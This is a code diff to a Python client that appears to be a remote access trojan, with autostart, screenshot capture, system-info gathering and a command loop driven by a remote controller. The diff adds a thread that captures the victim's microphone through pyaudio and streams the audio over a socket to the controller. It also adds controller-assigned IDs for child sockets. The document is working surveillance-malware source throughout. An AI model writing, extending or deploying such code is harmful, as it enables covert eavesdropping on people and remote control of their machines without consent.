@@ -10,6 +10,7 @@ import ctypes
 import sys
 import platform
 import zlib
+import pyaudio
 
 
 # INIT VARIABLES
@@ -217,10 +218,11 @@ def GetWindowTitle():
 
 
 class childSocket(threading.Thread):
-    def __init__(self):
+    def __init__(self, id):
         super(childSocket, self).__init__()
 
         self.active = True
+        self.id = id
 
     def run(self):
         self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -232,19 +234,47 @@ class childSocket(threading.Thread):
                 if data == 'pcinfo':
                     Send(self.socket, PCINFO(), mode)
                 else:
-                    Send(self.socket, 'child', mode)
+                    Send(self.socket, self.id, mode)
             except socket.error:
                 return
 
+class audioStreaming(threading.Thread):
+
+    def __init__(self, sock):
+        super(audioStreaming, self).__init__()
+
+        self.active = True
+        self.sock = sock
+
+        self.chunk = 1024
+        self.format = pyaudio.paInt16
+        self.channel = 1
+        self.rate = 10240
+
+        self.p = pyaudio.PyAudio()
+
+        self.stream = self.p.open(format=self.format,
+                                  channels=self.channel,
+                                  rate=self.rate,
+                                  input=True,
+                                  frames_per_buffer=self.chunk)
+
+    def run(self):
+        while self.active:
+            try:
+                data = self.stream.read(self.chunk)
+                Send(self.sock, data, 'audiostreaming')
+            except socket.error:
+                self.active = False
+
+        self.stream.close()
+        self.p.terminate()
+
 
 def startChildSocket(id):
-    try:
-        socketsBank[id] = childSocket()
-        socketsBank[id].setDaemon(True)
-        socketsBank[id].start()
-        return 'True'
-    except:
-        return 'False'
+    socketsBank[id] = childSocket(id)
+    socketsBank[id].setDaemon(True)
+    socketsBank[id].start()
 
 
 def fromAutostart():
@@ -269,8 +299,8 @@ def fromAutostart():
                 if data == 'getScreen':
                     Send(s, SCREENSHOT(), mode)
                     continue
-                if data == 'startChildSocket':
-                    Send(s, startChildSocket('tempid'), mode)
+                if data.startswith('startChildSocket'):
+                    Send(s, startChildSocket(str(data.split(' ')[-1])), mode)
                     continue
                 if data == passKey:
                     active = True
